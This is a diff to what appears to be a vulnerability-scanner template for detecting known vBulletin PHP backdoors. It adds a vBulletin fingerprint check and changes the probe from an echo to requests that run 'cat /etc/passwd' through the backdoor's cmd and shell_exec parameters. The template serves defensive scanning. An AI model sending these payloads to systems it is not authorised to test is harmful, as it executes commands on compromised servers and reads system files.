@@ -8,18 +8,32 @@ info:
     - https://github.com/OWASP/vbscan
     - https://blog.sucuri.net/2017/01/vbulletin-malware-hackers-compete-backdoor-control.html
   tags: backdoor,php,vbulletin,rce
-variables:
-  num: "999999999"
+
+flow: http(1) && http(2)
 
 http:
   - method: GET
     path:
-      - '{{BaseURL}}/faq.php?cmd=echo%20"{{num}}"'
-      - '{{BaseURL}}/forum.php?x=shell_exec&y=echo%20"{{num}}"'
-      - '{{BaseURL}}/{{paths}}/faq.php?cmd=echo%20"{{num}}"'
-      - '{{BaseURL}}/{{paths}}/forum.php?x=shell_exec&y=echo%20"{{num}}"'
-      - '{{paths}}.{{BaseURL}}/faq.php?cmd=echo%20"{{num}}"'
-      - '{{paths}}.{{BaseURL}}/forum.php?x=shell_exec&y=echo%20"{{num}}"'
+      - '{{BaseURL}}'
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "content=\"vBulletin"
+          - "id=\"vbulletin_css"
+          - "clientscript/vbulletin"
+          - "vBulletin_init"
+        condition: or
+
+  - method: GET
+    path:
+      - '{{BaseURL}}/faq.php?cmd=cat%20/etc/passwd'
+      - '{{BaseURL}}/forum.php?x=shell_exec&y=cat%20/etc/passwd'
+      - '{{BaseURL}}/{{paths}}/faq.php?cmd=cat%20/etc/passwd'
+      - '{{BaseURL}}/{{paths}}/forum.php?x=shell_exec&y=cat%20/etc/passwd'
+      - '{{paths}}.{{BaseURL}}/faq.php?cmd=cat%20/etc/passwd'
+      - '{{paths}}.{{BaseURL}}/forum.php?x=shell_exec&y=cat%20/etc/passwd'
 
     payloads:
       paths:
@@ -32,13 +46,9 @@ http:
     stop-at-first-match: true
     host-redirects: true
     max-redirects: 3
-    matchers-condition: and
     matchers:
-      - type: word
+      - type: dsl
+        dsl:
+          - "regex('root:.*:0:0:', body)"
+          - "status_code == 200"
         condition: and
-        words:
-          - "{{num}}"
-
-      - type: status
-        status:
-          - 200
